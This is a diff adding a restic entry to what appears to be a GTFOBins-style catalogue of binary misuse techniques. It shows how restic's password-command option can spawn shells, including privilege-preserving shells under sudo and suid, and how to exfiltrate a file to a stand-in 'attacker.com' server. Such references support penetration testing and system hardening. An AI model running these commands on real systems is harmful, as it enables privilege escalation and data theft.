@@ -1,0 +1,56 @@
+---
+functions:
+  command:
+  - blind: true
+    code: |-
+      RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  - blind: true
+    code: |-
+      restic --password-command='/path/to/command' backup
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
+      unprivileged:
+  - code: |-
+      restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
+      unprivileged:
+  upload:
+  - code: |-
+      restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver:
+      comment: |-
+        The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository use:
+
+        ```
+        rest-server --listen :12345
+        restic init -r rest:http://localhost:12345/x
+        ```
+
+        After the command executed on the target, to extract the data from the restic repository in the current directory on the attacker side:
+
+        ```
+        restic restore -r /tmp/restic/x latest --target .
+        ```
+...
